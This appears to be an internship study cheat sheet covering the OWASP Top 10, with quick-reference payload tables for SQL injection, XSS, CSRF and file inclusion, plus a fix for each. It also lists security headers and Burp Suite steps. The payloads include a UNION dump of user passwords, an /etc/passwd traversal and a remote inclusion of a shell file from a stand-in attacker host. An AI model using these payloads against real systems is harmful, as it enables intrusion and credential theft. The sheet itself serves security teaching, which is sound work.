# OWASP Top 10 Cheat Sheet

Quick reference for the OWASP Top 10 web application security risks — Task 3.

---

## OWASP Top 10 (2021)

| # | Risk | Description |
|---|------|-------------|
| A01 | Broken Access Control | Users act outside their permissions |
| A02 | Cryptographic Failures | Weak or missing encryption |
| A03 | Injection | SQL, OS, LDAP injection |
| A04 | Insecure Design | Missing security in architecture |
| A05 | Security Misconfiguration | Default configs, open cloud storage |
| A06 | Vulnerable Components | Outdated libraries with known CVEs |
| A07 | Auth Failures | Weak passwords, session issues |
| A08 | Data Integrity Failures | Unsigned updates, insecure CI/CD |
| A09 | Logging Failures | Insufficient monitoring and alerting |
| A10 | SSRF | Server-side request forgery |

---

## SQL Injection Quick Reference

| Payload | Purpose |
|---------|---------|
| `' OR '1'='1` | Auth bypass |
| `' UNION SELECT 1,2,3 --` | Column test |
| `' UNION SELECT user,password FROM users --` | Data dump |
| `' AND SLEEP(5) --` | Time-based blind |
| `admin' --` | Comment out rest of query |

**Fix:** Prepared statements, parameterized queries.

---

## XSS Quick Reference

| Payload | Type |
|---------|------|
| `<script>alert(1)</script>` | Basic |
| `<img src=x onerror=alert(1)>` | Event handler |
| `<svg onload=alert(1)>` | SVG-based |
| `"><script>alert(1)</script>` | Break out of attribute |

**Fix:** Input validation, output encoding, CSP.

---

## CSRF Quick Reference

| Vector | HTML |
|--------|------|
| Image tag | `<img src="http://site/action?param=val">` |
| Form | `<form action="http://site/action" method="POST">` |
| Link | `<a href="http://site/delete?id=1">Click</a>` |

**Fix:** CSRF tokens, SameSite cookies, referer validation.

---

## File Inclusion Quick Reference

| Payload | Type |
|---------|------|
| `../../../../etc/passwd` | LFI |
| `http://attacker.com/shell.txt` | RFI |
| `php://filter/convert.base64-encode/resource=config.php` | PHP wrapper |

**Fix:** Whitelist, disable `allow_url_include`.

---

## Security Headers Quick Reference

| Header | Value |
|--------|-------|
| HSTS | `max-age=31536000; includeSubDomains` |
| CSP | `default-src 'self'; script-src 'self'` |
| X-Frame-Options | `SAMEORIGIN` |
| X-Content-Type-Options | `nosniff` |
| Referrer-Policy | `strict-origin-when-cross-origin` |

---

## Burp Suite Quick Reference

| Action | Steps |
|--------|-------|
| Intercept | Proxy → Intercept ON → browse target |
| Repeater | Right-click request → Send to Repeater |
| Intruder | Right-click → Send to Intruder → set payloads |
| History | Proxy → HTTP History → filter/search |

---

*ApexPlanet Cybersecurity Internship — Task 3*
